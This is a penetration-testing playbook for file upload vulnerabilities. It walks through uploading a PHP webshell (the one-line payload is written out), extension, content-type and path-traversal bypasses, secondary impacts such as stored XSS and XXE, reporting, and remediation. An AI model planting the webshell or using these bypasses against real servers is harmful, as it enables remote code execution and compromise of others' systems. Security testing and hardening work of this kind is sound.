# Playbook: File Upload Attacks

Any multipart upload the server later serves or processes: avatar/profile,
document/import, attachments, image processing, resume, CSV/XML. Goal: an
executable file in a web-reachable path -> webshell -> RCE.

## Method

1. Upload a normal file; find its stored URL and location.
2. Try a webshell (`shell.php`: `<?php system($_GET['c']); ?>`); reach its URL.
3. **Extension bypass:** `shell.php.jpg`, `shell.jpg.php`, `.phtml`/`.php5`/`.phar`,
   case `.pHp`, trailing dot/space (Windows), `%00`.
4. **Content bypass:** set `Content-Type: image/jpeg`; prepend `GIF89a;` magic bytes
   before `<?php`; image/PHP polyglot.
5. **Placement bypass:** path traversal in the filename to reach the webroot;
   `.htaccess` upload to make an innocuous extension execute.
6. **No-RCE impact:** SVG/HTML upload -> stored XSS; DOCX/SVG -> XXE; image parser
   -> SSRF/DoS (ImageTragick); predictable paths -> overwrite other users' files.

## Report

PoC = the uploaded file, its URL, and executed command output (webshell = Critical)
or the stored-XSS execution. 

## Remediation

Server-side allow-list of extension + MIME + magic bytes; store outside webroot or
on a separate domain served with `Content-Disposition: attachment` and no execution;
randomize filenames; strip path components; re-encode images; disable script
execution in upload dirs.
